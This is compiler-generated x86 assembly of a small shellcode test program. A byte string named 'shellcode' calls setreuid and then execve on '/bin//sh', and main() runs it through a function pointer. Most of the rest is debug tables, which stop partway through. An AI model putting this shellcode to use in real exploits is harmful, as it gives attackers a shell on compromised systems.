	.file	"shellcode2.c"
	.text
.Ltext0:
	.globl	shellcode
	.data
	.align 32
	.type	shellcode, @object
	.size	shellcode, 36
shellcode:
	.string	"1\300\260F1\3331\311\315\2001\300Ph//shh/bin\211\343PS\211\3411\322\260\013\315\200"
	.text
	.globl	main
	.type	main, @function
main:
.LFB0:
	.file 1 "shellcode2.c"
	.loc 1 11 0
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	movl	%esp, %ebp
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x7c,0x6
	subl	$20, %esp
	.loc 1 13 0
	movl	$shellcode, -12(%ebp)
	.loc 1 14 0
	movl	-12(%ebp), %eax
	call	*%eax
.LVL0:
	movl	$0, %eax
	.loc 1 15 0
	addl	$20, %esp
	popl	%ecx
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	popl	%ebp
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE0:
	.size	main, .-main
.Letext0:
	.section	.debug_info,"",@progbits
.Ldebug_info0:
	.long	0x8a
	.value	0x4
	.long	.Ldebug_abbrev0
	.byte	0x4
	.uleb128 0x1
	.long	.LASF337
	.byte	0xc
	.long	.LASF338
	.long	.LASF339
	.long	.Ltext0
	.long	.Letext0-.Ltext0
	.long	.Ldebug_line0
	.long	.Ldebug_macro0
	.uleb128 0x2
	.long	0x40
	.long	0x39
	.uleb128 0x3
	.long	0x39
	.byte	0x23
	.byte	0
	.uleb128 0x4
	.byte	0x4
	.byte	0x7
	.long	.LASF335
	.uleb128 0x4
	.byte	0x1
	.byte	0x6
	.long	.LASF336
	.uleb128 0x5
	.long	.LASF340
	.byte	0x1
	.byte	0x1
	.long	0x29
	.uleb128 0x5
	.byte	0x3
	.long	shellcode
	.uleb128 0x6
	.long	.LASF341
	.byte	0x1
	.byte	0xa
	.long	0x7f
	.long	.LFB0
	.long	.LFE0-.LFB0
	.uleb128 0x1
	.byte	0x9c
	.long	0x7f
	.uleb128 0x7
	.string	"fp"
	.byte	0x1
	.byte	0xc
	.long	0x87
	.uleb128 0x2
	.byte	0x75
	.sleb128 -12
	.byte	0
	.uleb128 0x8
	.byte	0x4
	.byte	0x5
	.string	"int"
	.uleb128 0x9
	.uleb128 0xa
	.byte	0x4
	.long	0x86
	.byte	0
	.section	.debug_abbrev,"",@progbits
.Ldebug_abbrev0:
	.uleb128 0x1
	.uleb128 0x11
	.byte	0x1
	.uleb128 0x25
	.uleb128 0xe
	.uleb128 0x13
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x1b
	.uleb128 0xe
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x6
	.uleb128 0x10
	.uleb128 0x17
	.uleb128 0x2119
	.uleb128 0x17
	.byte	0
	.byte	0
	.uleb128 0x2
	.uleb128 0x1
	.byte	0x1
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x3
	.uleb128 0x21
	.byte	0
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2f
	.uleb128 0xb
	.byte	0
	.byte	0
	.uleb128 0x4
	.uleb128 0x24
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0xe
	.byte	0
	.byte	0
	.uleb128 0x5
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x6
	.uleb128 0x2e
	.byte	0x1
	.uleb128 0x3f
	.uleb128 0x19
	.uleb128 0x3
	.uleb128 0xe
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x11
	.uleb128 0x1
	.uleb128 0x12
	.uleb128 0x6
	.uleb128 0x40
	.uleb128 0x18
	.uleb128 0x2116
	.uleb128 0x19
	.uleb128 0x1
	.uleb128 0x13
	.byte	0
	.byte	0
	.uleb128 0x7
	.uleb128 0x34
	.byte	0
	.uleb128 0x3
	.uleb128 0x8
	.uleb128 0x3a
	.uleb128 0xb
	.uleb128 0x3b
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.uleb128 0x2
	.uleb128 0x18
	.byte	0
	.byte	0
	.uleb128 0x8
	.uleb128 0x24
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x3e
	.uleb128 0xb
	.uleb128 0x3
	.uleb128 0x8
	.byte	0
	.byte	0
	.uleb128 0x9
	.uleb128 0x15
	.byte	0
	.uleb128 0x27
	.uleb128 0x19
	.byte	0
	.byte	0
	.uleb128 0xa
	.uleb128 0xf
	.byte	0
	.uleb128 0xb
	.uleb128 0xb
	.uleb128 0x49
	.uleb128 0x13
	.byte	0
	.byte	0
	.byte	0
	.section	.debug_aranges,"",@progbits
	.long	0x1c
	.value	0x2
	.long	.Ldebug_info0
	.byte	0x4
	.byte	0
	.value	0
	.value	0
	.long	.Ltext0
	.long	.Letext0-.Ltext0
	.long	0
	.long	0
	.section	.debug_macro,"",@progbits
.Ldebug_macro0:
	.value	0x4
	.byte	0x2
	.long	.Ldebug_line0
	.byte	0x7
	.long	.Ldebug_macro1
	.byte	0x3
	.uleb128 0
	.uleb128 0x1
	.file 2 "/usr/include/stdc-predef.h"
	.byte	0x3
	.uleb128 0x1f
	.uleb128 0x2
	.byte	0x7
	.long	.Ldebug_macro2
	.byte	0x4
	.byte	0x4
	.byte	0
	.section	.debug_macro,"G",@progbits,wm4.0.73009fa31b2aeb321c8cc29297f30306,comdat
.Ldebug_macro1:
	.value	0x4
	.byte	0
	.byte	0x5
	.uleb128 0
	.long	.LASF0
	.byte	0x5
	.uleb128 0
	.long	.LASF1
	.byte	0x5
	.uleb128 0
	.long	.LASF2
	.byte	0x5
	.uleb128 0
	.long	.LASF3
	.byte	0x5
	.uleb128 0
	.long	.LASF4
	.byte	0x5
	.uleb128 0
	.long	.LASF5
	.byte	0x5
	.uleb128 0
	.long	.LASF6
	.byte	0x5
	.uleb128 0
	.long	.LASF7
	.byte	0x5
	.uleb128 0
	.long	.LASF8
	.byte	0x5
	.uleb128 0
	.long	.LASF9
	.byte	0x5
	.uleb128 0
	.long	.LASF10
	.byte	0x5
	.uleb128 0
	.long	.LASF11
	.byte	0x5
	.uleb128 0
	.long	.LASF12
	.byte	0x5
	.uleb128 0
	.long	.LASF13
	.byte	0x5
	.uleb128 0
	.long	.LASF14
	.byte	0x5
	.uleb128 0
	.long	.LASF15
	.byte	0x5
	.uleb128 0
	.long	.LASF16
	.byte	0x5
	.uleb128 0
	.long	.LASF17
	.byte	0x5
	.uleb128 0
	.long	.LASF18
	.byte	0x5
	.uleb128 0
	.long	.LASF19
	.byte	0x5
	.uleb128 0
	.long	.LASF20
	.byte	0x5
	.uleb128 0
	.long	.LASF21
	.byte	0x5
	.uleb128 0
	.long	.LASF22
	.byte	0x5
	.uleb128 0
	.long	.LASF23
	.byte	0x5
	.uleb128 0
	.long	.LASF24
	.byte	0x5
	.uleb128 0
	.long	.LASF25
	.byte	0x5
	.uleb128 0
	.long	.LASF26
	.byte	0x5
	.uleb128 0
	.long	.LASF27
	.byte	0x5
	.uleb128 0
	.long	.LASF28
	.byte	0x5
	.uleb128 0
	.long	.LASF29
	.byte	0x5
	.uleb128 0
	.long	.LASF30
	.byte	0x5
	.uleb128 0
	.long	.LASF31
	.byte	0x5
	.uleb128 0
	.long	.LASF32
	.byte	0x5
	.uleb128 0
	.long	.LASF33
	.byte	0x5
	.uleb128 0
	.long	.LASF34
	.byte	0x5
	.uleb128 0
	.long	.LASF35
	.byte	0x5
	.uleb128 0
	.long	.LASF36
	.byte	0x5
	.uleb128 0
	.long	.LASF37
	.byte	0x5
	.uleb128 0
	.long	.LASF38
	.byte	0x5
	.uleb128 0
	.long	.LASF39
	.byte	0x5
	.uleb128 0
	.long	.LASF40
	.byte	0x5
	.uleb128 0
	.long	.LASF41
	.byte	0x5
	.uleb128 0
	.long	.LASF42
	.byte	0x5
	.uleb128 0
	.long	.LASF43
	.byte	0x5
	.uleb128 0
	.long	.LASF44
	.byte	0x5
	.uleb128 0
	.long	.LASF45
	.byte	0x5
	.uleb128 0
	.long	.LASF46
	.byte	0x5
	.uleb128 0
	.long	.LASF47
	.byte	0x5
	.uleb128 0
	.long	.LASF48
	.byte	0x5
	.uleb128 0
	.long	.LASF49
	.byte	0x5
	.uleb128 0
	.long	.LASF50
	.byte	0x5
	.uleb128 0
	.long	.LASF51
	.byte	0x5
	.uleb128 0
	.long	.LASF52
	.byte	0x5
	.uleb128 0
	.long	.LASF53
	.byte	0x5
	.uleb128 0
	.long	.LASF54
	.byte	0x5
	.uleb128 0
	.long	.LASF55
	.byte	0x5
	.uleb128 0
	.long	.LASF56
	.byte	0x5
	.uleb128 0
	.long	.LASF57
	.byte	0x5
	.uleb128 0
	.long	.LASF58
	.byte	0x5
	.uleb128 0
	.long	.LASF59
	.byte	0x5
	.uleb128 0
	.long	.LASF60
	.byte	0x5
	.uleb128 0
	.long	.LASF61
	.byte	0x5
	.uleb128 0
	.long	.LASF62
	.byte	0x5
	.uleb128 0
	.long	.LASF63
	.byte	0x5
	.uleb128 0
	.long	.LASF64
	.byte	0x5
	.uleb128 0
	.long	.LASF65
	.byte	0x5
	.uleb128 0
	.long	.LASF66
	.byte	0x5
	.uleb128 0
	.long	.LASF67
	.byte	0x5
	.uleb128 0
	.long	.LASF68
	.byte	0x5
	.uleb128 0
	.long	.LASF69
	.byte	0x5
	.uleb128 0
	.long	.LASF70
	.byte	0x5
	.uleb128 0
	.long	.LASF71
	.byte	0x5
	.uleb128 0
	.long	.LASF72
	.byte	0x5
	.uleb128 0
	.long	.LASF73
	.byte	0x5
	.uleb128 0
	.long	.LASF74
	.byte	0x5
	.uleb128 0
	.long	.LASF75
	.byte	0x5
	.uleb128 0
	.long	.LASF76
	.byte	0x5
	.uleb128 0
	.long	.LASF77
	.byte	0x5
	.uleb128 0
	.long	.LASF78
	.byte	0x5
	.uleb128 0
	.long	.LASF79
	.byte	0x5
	.uleb128 0
	.long	.LASF80
	.byte	0x5
	.uleb128 0
	.long	.LASF81
	.byte	0x5
	.uleb128 0
	.long	.LASF82
	.byte	0x5
	.uleb128 0
	.long	.LASF83
	.byte	0x5
	.uleb128 0
	.long	.LASF84
	.byte	0x5
	.uleb128 0
	.long	.LASF85
	.byte	0x5
	.uleb128 0
	.long	.LASF86
	.byte	0x5
	.uleb128 0
	.long	.LASF87
	.byte	0x5
	.uleb128 0
	.long	.LASF88
	.byte	0x5
	.uleb128 0
	.long	.LASF89
	.byte	0x5
	.uleb128 0
	.long	.LASF90
	.byte	0x5
	.uleb128 0
	.long	.LASF91
	.byte	0x5
	.uleb128 0
	.long	.LASF92
	.byte	0x5
	.uleb128 0
	.long	.LASF93
	.byte	0x5
	.uleb128 0
	.long	.LASF94
	.byte	0x5
	.uleb128 0
	.long	.LASF95
	.byte	0x5
	.uleb128 0
	.long	.LASF96
	.byte	0x5
	.uleb128 0
	.long	.LASF97
	.byte	0x5
	.uleb128 0
	.long	.LASF98
	.byte	0x5
	.uleb128 0
	.long	.LASF99
	.byte	0x5
	.uleb128 0
	.long	.LASF100
	.byte	0x5
	.uleb128 0
	.long	.LASF101
	.byte	0x5
	.uleb128 0
	.long	.LASF102
	.byte	0x5
	.uleb128 0
	.long	.LASF103
	.byte	0x5
	.uleb128 0
	.long	.LASF104
	.byte	0x5
	.uleb128 0
	.long	.LASF105
	.byte	0x5
	.uleb128 0
	.long	.LASF106
	.byte	0x5
	.uleb128 0
	.long	.LASF107
	.byte	0x5
	.uleb128 0
	.long	.LASF108
	.byte	0x5
	.uleb128 0
	.long	.LASF109
	.byte	0x5
	.uleb128 0
	.long	.LASF110
	.byte	0x5
	.uleb128 0
	.long	.LASF111
	.byte	0x5
	.uleb128 0
	.long	.LASF112
	.byte	0x5
	.uleb128 0
	.long	.LASF113
	.byte	0x5
	.uleb128 0
	.long	.LASF114
	.byte	0x5
	.uleb128 0
	.long	.LASF115
	.byte	0x5
	.uleb128 0
	.long	.LASF116
	.byte	0x5
	.uleb128 0
	.long	.LASF117
	.byte	0x5
	.uleb128 0
	.long	.LASF118
	.byte	0x5
	.uleb128 0
	.long	.LASF119
	.byte	0x5
	.uleb128 0
	.long	.LASF120
	.byte	0x5
	.uleb128 0
	.long	.LASF121
	.byte	0x5
	.uleb128 0
	.long	.LASF122
	.byte	0x5
	.uleb128 0
	.long	.LASF123
	.byte	0x5
	.uleb128 0
	.long	.LASF124
	.byte	0x5
	.uleb128 0
	.long	.LASF125
	.byte	0x5
	.uleb128 0
	.long	.LASF126
	.byte	0x5
	.uleb128 0
	.long	.LASF127
	.byte	0x5
	.uleb128 0
	.long	.LASF128
	.byte	0x5
	.uleb128 0
	.long	.LASF129
	.byte	0x5
	.uleb128 0
	.long	.LASF130
	.byte	0x5
	.uleb128 0
	.long	.LASF131
	.byte	0x5
	.uleb128 0
	.long	.LASF132
	.byte	0x5
	.uleb128 0
	.long	.LASF133
	.byte	0x5
	.uleb128 0
	.long	.LASF134
	.byte	0x5
	.uleb128 0
	.long	.LASF135
	.byte	0x5
	.uleb128 0
	.long	.LASF136
	.byte	0x5
	.uleb128 0
	.long	.LASF137
	.byte	0x5
	.uleb128 0
	.long	.LASF138
	.byte	0x5
	.uleb128 0
	.long	.LASF139
	.byte	0x5
	.uleb128 0
	.long	.LASF140
	.byte	0x5
	.uleb128 0
	.long	.LASF141
	.byte	0x5
	.uleb128 0
	.long	.LASF142
	.byte	0x5
	.uleb128 0
	.long	.LASF143
	.byte	0x5
	.uleb128 0
	.long	.LASF144
	.byte	0x5
	.uleb128 0
	.long	.LASF145
	.byte	0x5
	.uleb128 0
	.long	.LASF146
	.byte	0x5
	.uleb128 0
	.long	.LASF147
	.byte	0x5
	.uleb128 0
	.long	.LASF148
	.byte	0x5
	.uleb128 0
	.long	.LASF149
	.byte	0x5
	.uleb128 0
	.long	.LASF150
	.byte	0x5
	.uleb128 0
	.long	.LASF151
	.byte	0x5
	.uleb128 0
	.long	.LASF152
	.byte	0x5
	.uleb128 0
	.long	.LASF153
	.byte	0x5
	.uleb128 0
	.long	.LASF154
	.byte	0x5
	.uleb128 0
	.long	.LASF155
	.byte	0x5
	.uleb128 0
	.long	.LASF156
	.byte	0x5
	.uleb128 0
	.long	.LASF157
	.byte	0x5
	.uleb128 0
	.long	.LASF158
	.byte	0x5
	.uleb128 0
	.long	.LASF159
	.byte	0x5
	.uleb128 0
	.long	.LASF160
	.byte	0x5
	.uleb128 0
	.long	.LASF161
	.byte	0x5
	.uleb128 0
	.long	.LASF162
	.byte	0x5
	.uleb128 0
	.long	.LASF163
	.byte	0x5
	.uleb128 0
	.long	.LASF164
	.byte	0x5
	.uleb128 0
	.long	.LASF165
	.byte	0x5
	.uleb128 0
	.long	.LASF166
	.byte	0x5
	.uleb128 0
	.long	.LASF167
	.byte	0x5
	.uleb128 0
	.long	.LASF168
	.byte	0x5
	.uleb128 0
	.long	.LASF169
	.byte	0x5
	.uleb128 0
	.long	.LASF170
	.byte	0x5
	.uleb128 0
	.long	.LASF171
	.byte	0x5
	.uleb128 0
	.long	.LASF172
	.byte	0x5
	.uleb128 0
	.long	.LASF173
	.byte	0x5
	.uleb128 0
	.long	.LASF174
	.byte	0x5
	.uleb128 0
	.long	.LASF175
	.byte	0x5
	.uleb128 0
	.long	.LASF176
	.byte	0x5
	.uleb128 0
	.long	.LASF177
	.byte	0x5
	.uleb128 0
	.long	.LASF178
	.byte	0x5
	.uleb128 0
	.long	.LASF179
	.byte	0x5
	.uleb128 0
	.long	.LASF180
	.byte	0x5
	.uleb128 0
	.long	.LASF181
	.byte	0x5
	.uleb128 0
	.long	.LASF182
	.byte	0x5
	.uleb128 0
	.long	.LASF183
	.byte	0x5
	.uleb128 0
	.long	.LASF184
	.byte	0x5
	.uleb128 0
	.long	.LASF185
	.byte	0x5
	.uleb128 0
	.long	.LASF186
	.byte	0x5
	.uleb128 0
	.long	.LASF187
	.byte	0x5
	.uleb128 0
	.long	.LASF188
	.byte	0x5
	.uleb128 0
	.long	.LASF189
	.byte	0x5
	.uleb128 0
	.long	.LASF190
	.byte	0x5
	.uleb128 0
	.long	.LASF191
	.byte	0x5
	.uleb128 0
	.long	.LASF192
	.byte	0x5
	.uleb128 0
	.long	.LASF193
	.byte	0x5
	.uleb128 0
	.long	.LASF194
	.byte	0x5
	.uleb128 0
	.long	.LASF195
	.byte	0x5
	.uleb128 0
	.long	.LASF196
	.byte	0x5
	.uleb128 0
	.long	.LASF197
	.byte	0x5
	.uleb128 0
	.long	.LASF198
	.byte	0x5
	.uleb128 0
	.long	.LASF199
	.byte	0x5
	.uleb128 0
	.long	.LASF200
	.byte	0x5
	.uleb128 0
	.long	.LASF201
	.byte	0x5
	.uleb128 0
	.long	.LASF202
	.byte	0x5
	.uleb128 0
	.long	.LASF203
	.byte	0x5
	.uleb128 0
	.long	.LASF204
	.byte	0x5
	.uleb128 0
	.long	.LASF205
	.byte	0x5
	.uleb128 0
	.long	.LASF206
	.byte	0x5
	.uleb128 0
	.long	.LASF207
	.byte	0x5
	.uleb128 0
	.long	.LASF208
	.byte	0x5
	.uleb128 0
	.long	.LASF209
	.byte	0x5
	.uleb128 0
	.long	.LASF210
	.byte	0x5
	.uleb128 0
	.long	.LASF211
	.byte	0x5
	.uleb128 0
	.long	.LASF212
	.byte	0x5
	.uleb128 0
	.long	.LASF213
	.byte	0x5
	.uleb128 0
	.long	.LASF214
	.byte	0x5
	.uleb128 0
	.long	.LASF215
	.byte	0x5
	.uleb128 0
	.long	.LASF216
	.byte	0x5
	.uleb128 0
	.long	.LASF217
	.byte	0x5
	.uleb128 0
	.long	.LASF218
	.byte	0x5
	.uleb128 0
	.long	.LASF219
	.byte	0x5
	.uleb128 0
	.long	.LASF220
	.byte	0x5
	.uleb128 0
	.long	.LASF221
	.byte	0x5
	.uleb128 0
	.long	.LASF222
	.byte	0x5
	.uleb128 0
	.long	.LASF223
	.byte	0x5
	.uleb128 0
	.long	.LASF224
	.byte	0x5
	.uleb128 0
	.long	.LASF225
	.byte	0x5
	.uleb128 0
	.long	.LASF226
	.byte	0x5
	.uleb128 0
	.long	.LASF227
	.byte	0x5
	.uleb128 0
	.long	.LASF228
	.byte	0x5
	.uleb128 0
	.long	.LASF229
	.byte	0x5
	.uleb128 0
	.long	.LASF230
	.byte	0x5
	.uleb128 0
	.long	.LASF231
	.byte	0x5
	.uleb128 0
	.long	.LASF232
	.byte	0x5
	.uleb128 0
	.long	.LASF233
	.byte	0x5
	.uleb128 0
	.long	.LASF234
	.byte	0x5
	.uleb128 0
	.long	.LASF235
	.byte	0x5
	.uleb128 0
	.long	.LASF236
	.byte	0x5
	.uleb128 0
	.long	.LASF237
	.byte	0x5
	.uleb128 0
	.long	.LASF238
	.byte	0x5
	.uleb128 0
	.long	.LASF239
	.byte	0x5
	.uleb128 0
	.long	.LASF240
	.byte	0x5
	.uleb128 0
	.long	.LASF241
	.byte	0x5
	.uleb128 0
	.long	.LASF242
	.byte	0x5
	.uleb128 0
	.long	.LASF243
	.byte	0x5
	.uleb128 0
	.long	.LASF244
	.byte	0x5
	.uleb128 0
	.long	.LASF245
	.byte	0x5
	.uleb128 0
	.long	.LASF246
	.byte	0x5
	.uleb128 0
	.long	.LASF247
	.byte	0x5
	.uleb128 0
	.long	.LASF248
	.byte	0x5
	.uleb128 0
	.long	.LASF249
	.byte	0x5
	.uleb128 0
	.long	.LASF250
	.byte	0x5
	.uleb128 0
	.long	.LASF251
	.byte	0x5
	.uleb128 0
	.long	.LASF252
	.byte	0x5
	.uleb128 0
	.long	.LASF253
	.byte	0x5
	.uleb128 0
	.long	.LASF254
	.byte	0x5
	.uleb128 0
	.long	.LASF255
	.byte	0x5
	.uleb128 0
	.long	.LASF256
	.byte	0x5
	.uleb128 0
	.long	.LASF257
	.byte	0x5
	.uleb128 0
	.long	.LASF258
	.byte	0x5
	.uleb128 0
	.long	.LASF259
	.byte	0x5
	.uleb128 0
	.long	.LASF260
	.byte	0x5
	.uleb128 0
	.long	.LASF261
	.byte	0x5
	.uleb128 0
	.long	.LASF262
	.byte	0x5
	.uleb128 0
	.long	.LASF263
	.byte	0x5
	.uleb128 0
	.long	.LASF264
	.byte	0x5
	.uleb128 0
	.long	.LASF265
	.byte	0x5
	.uleb128 0
	.long	.LASF266
	.byte	0x5
	.uleb128 0
	.long	.LASF267
	.byte	0x5
	.uleb128 0
	.long	.LASF268
	.byte	0x5
	.uleb128 0
	.long	.LASF269
	.byte	0x5
	.uleb128 0
	.long	.LASF270
	.byte	0x5
	.uleb128 0
	.long	.LASF271
	.byte	0x5
	.uleb128 0
	.long	.LASF272
	.byte	0x5
	.uleb128 0
	.long	.LASF273
	.byte	0x5
	.uleb128 0
	.long	.LASF274
	.byte	0x5
	.uleb128 0
	.long	.LASF275
	.byte	0x5
	.uleb128 0
	.long	.LASF276
	.byte	0x5
	.uleb128 0
	.long	.LASF277
	.byte	0x5
	.uleb128 0
	.long	.LASF278
	.byte	0x5
	.uleb128 0
	.long	.LASF279
	.byte	0x5
	.uleb128 0
	.long	.LASF280
	.byte	0x5
	.uleb128 0
	.long	.LASF281
	.byte	0x5
	.uleb128 0
	.long	.LASF282
	.byte	0x5
	.uleb128 0
	.long	.LASF283
	.byte	0x5
	.uleb128 0
	.long	.LASF284
	.byte	0x5
	.uleb128 0
	.long	.LASF285
	.byte	0x5
	.uleb128 0
	.long	.LASF286
	.byte	0x5
	.uleb128 0
	.long	.LASF287
	.byte	0x5
	.uleb128 0
	.long	.LASF288
	.byte	0x5
	.uleb128 0
	.long	.LASF289
	.byte	0x5
	.uleb128 0
	.long	.LASF290
	.byte	0x5
	.uleb128 0
	.long	.LASF291
	.byte	0x5
	.uleb128 0
	.long	.LASF292
	.byte	0x5
	.uleb128 0
	.long	.LASF293
	.byte	0x5
	.uleb128 0
	.long	.LASF294
	.byte	0x5
	.uleb128 0
	.long	.LASF295
	.byte	0x5
	.uleb128 0
	.long	.LASF296
	.byte	0x5
	.uleb128 0
	.long	.LASF297
	.byte	0x5
	.uleb128 0
	.long	.LASF298
	.byte	0x5
	.uleb128 0
	.long	.LASF299
	.byte	0x5
	.uleb128 0
	.long	.LASF300
	.byte	0x5
	.uleb128 0
	.long	.LASF301
	.byte	0x5
	.uleb128 0
	.long	.LASF302
	.byte	0x5
	.uleb128 0
	.long	.LASF303
	.byte	0x5
	.uleb128 0
	.long	.LASF304
	.byte	0x5
	.uleb128 0
	.long	.LASF305
	.byte	0x5
	.uleb128 0
	.long	.LASF306
	.byte	0x5
	.uleb128 0
	.long	.LASF307
	.byte	0x5
	.uleb128 0
	.long	.LASF308
	.byte	0x5
	.uleb128 0
	.long	.LASF309
	.byte	0x5
	.uleb128 0
	.long	.LASF310
	.byte	0x5
	.uleb128 0
	.long	.LASF311
	.byte	0x5
	.uleb128 0
	.long	.LASF312
	.byte	0x5
	.uleb128 0
	.long	.LASF313
	.byte	0x5
	.uleb128 0
	.long	.LASF314
	.byte	0x5
	.uleb128 0
	.long	.LASF315
	.byte	0x5
	.uleb128 0
	.long	.LASF316
	.byte	0x5
	.uleb128 0
	.long	.LASF317
	.byte	0x5
	.uleb128 0
	.long	.LASF318
	.byte	0x5
	.uleb128 0
	.long	.LASF319
	.byte	0x5
	.uleb128 0
	.long	.LASF320
	.byte	0x5
	.uleb128 0
	.long	.LASF321
	.byte	0x5
	.uleb128 0
	.long	.LASF322
	.byte	0x5
	.uleb128 0
	.long	.LASF323
	.byte	0x5
	.uleb128 0
	.long	.LASF324
	.byte	0x5
	.uleb128 0
	.long	.LASF325
	.byte	0x5
	.uleb128 0
	.long	.LASF326
	.byte	0x5
	.uleb128 0
	.long	.LASF327
	.byte	0x5
	.uleb128 0
	.long	.LASF328
	.byte	0x5
	.uleb128 0
	.long	.LASF329
	.byte	0
	.section	.debug_macro,"G",@progbits,wm4.stdcpredef.h.19.006d14bbbe0dc07ba9b1ce3fdc8e40d3,comdat
.Ldebug_macro2:
	.value	0x4
	.byte	0
	.byte	0x5
	.uleb128 0x13
	.long	.LASF330
	.byte	0x5
	.uleb128 0x26
	.long	.LASF331
	.byte	0x5
	.uleb128 0x2e
	.long	.LASF332
	.byte	0x5
	.uleb128 0x3a
	.long	.LASF333
	.byte	0x5
	.uleb128 0x3d
	.long	.LASF334
	.byte	0
	.section	.debug_line,"",@progbits
.Ldebug_line0:
	.section	.debug_str,"MS",@progbits,1
.LASF119:
	.string	"__UINT_LEAST8_MAX__ 0xff"
.LASF223:
	.string	"__FLT128_MAX_EXP__ 16384"
.LASF132:
	.string	"__INT_FAST32_WIDTH__ 32"
.LASF247:
	.string	"__FLT64X_MANT_DIG__ 64"
.LASF192:
	.string	"__FLT32_DIG__ 6"
.LASF126:
	.string	"__UINT64_C(c) c ## ULL"
.LASF24:
	.string	"__SIZEOF_SIZE_T__ 4"
.LASF249:
	.string	"__FLT64X_MIN_EXP__ (-16381)"
.LASF123:
	.string	"__UINT_LEAST32_MAX__ 0xffffffffU"
.LASF157:
	.string	"__FLT_EPSILON__ 1.19209289550781250000000000000000000e-7F"
.LASF117:
	.string	"__INT64_C(c) c ## LL"
.LASF32:
	.string	"__SIZEOF_POINTER__ 4"
.LASF325:
	.string	"__unix 1"
.LASF1:
	.string	"__STDC_VERSION__ 201112L"
.LASF87:
	.string	"__WCHAR_WIDTH__ 32"
.LASF276:
	.string	"__DEC128_MIN_EXP__ (-6142)"
.LASF268:
	.string	"__DEC64_MANT_DIG__ 16"
.LASF315:
	.string	"__i686__ 1"
.LASF340:
	.string	"shellcode"
.LASF170:
	.string	"__DBL_MIN__ ((double)2.22507385850720138309023271733240406e-308L)"
.LASF69:
	.string	"__has_include_next(STR) __has_include_next__(STR)"
.LASF49:
	.string	"__UINT64_TYPE__ long long unsigned int"
.LASF213:
	.string	"__FLT64_MIN__ 2.22507385850720138309023271733240406e-308F64"
.LASF237:
	.string	"__FLT32X_MAX_EXP__ 1024"
.LASF181:
	.string	"__LDBL_MAX_10_EXP__ 4932"
.LASF204:
	.string	"__FLT32_HAS_QUIET_NAN__ 1"
.LASF11:
	.string	"__ATOMIC_SEQ_CST 5"
.LASF212:
	.string	"__FLT64_MAX__ 1.79769313486231570814527423731704357e+308F64"
.LASF304:
	.string	"__SIZEOF_WINT_T__ 4"
.LASF94:
	.string	"__UINTMAX_C(c) c ## ULL"
.LASF185:
	.string	"__LDBL_MIN__ 3.36210314311209350626267781732175260e-4932L"
.LASF115:
	.string	"__INT_LEAST32_WIDTH__ 32"
.LASF310:
	.string	"__SIZEOF_FLOAT128__ 16"
.LASF174:
	.string	"__DBL_HAS_INFINITY__ 1"
.LASF232:
	.string	"__FLT128_HAS_QUIET_NAN__ 1"
.LASF236:
	.string	"__FLT32X_MIN_10_EXP__ (-307)"
.LASF242:
	.string	"__FLT32X_EPSILON__ 2.22044604925031308084726333618164062e-16F32x"
.LASF258:
	.string	"__FLT64X_HAS_DENORM__ 1"
.LASF317:
	.string	"__pentiumpro__ 1"
.LASF4:
	.string	"__STDC_HOSTED__ 1"
.LASF81:
	.string	"__SIZE_MAX__ 0xffffffffU"
.LASF327:
	.string	"unix 1"
.LASF214:
	.string	"__FLT64_EPSILON__ 2.22044604925031308084726333618164062e-16F64"
.LASF145:
	.string	"__FLT_EVAL_METHOD_TS_18661_3__ 2"
.LASF171:
	.string	"__DBL_EPSILON__ ((double)2.22044604925031308084726333618164062e-16L)"
.LASF250:
	.string	"__FLT64X_MIN_10_EXP__ (-4931)"
.LASF294:
	.string	"__GCC_ATOMIC_WCHAR_T_LOCK_FREE 2"
.LASF48:
	.string	"__UINT32_TYPE__ unsigned int"
.LASF33:
	.string	"__SIZE_TYPE__ unsigned int"
.LASF218:
	.string	"__FLT64_HAS_QUIET_NAN__ 1"
.LASF274:
	.string	"__DEC64_SUBNORMAL_MIN__ 0.000000000000001E-383DD"
.LASF82:
	.string	"__SCHAR_WIDTH__ 8"
.LASF186:
	.string	"__LDBL_EPSILON__ 1.08420217248550443400745280086994171e-19L"
.LASF313:
	.string	"__GCC_ASM_FLAG_OUTPUTS__ 1"
.LASF162:
	.string	"__DBL_MANT_DIG__ 53"
.LASF57:
	.string	"__UINT_LEAST64_TYPE__ long long unsigned int"
.LASF127:
	.string	"__INT_FAST8_MAX__ 0x7f"
.LASF175:
	.string	"__DBL_HAS_QUIET_NAN__ 1"
.LASF116:
	.string	"__INT_LEAST64_MAX__ 0x7fffffffffffffffLL"
.LASF83:
	.string	"__SHRT_WIDTH__ 16"
.LASF263:
	.string	"__DEC32_MAX_EXP__ 97"
.LASF44:
	.string	"__INT32_TYPE__ int"
.LASF41:
	.string	"__SIG_ATOMIC_TYPE__ int"
.LASF164:
	.string	"__DBL_MIN_EXP__ (-1021)"
.LASF18:
	.string	"__SIZEOF_LONG__ 4"
.LASF112:
	.string	"__INT_LEAST16_WIDTH__ 16"
.LASF222:
	.string	"__FLT128_MIN_10_EXP__ (-4931)"
.LASF203:
	.string	"__FLT32_HAS_INFINITY__ 1"
.LASF189:
	.string	"__LDBL_HAS_INFINITY__ 1"
.LASF316:
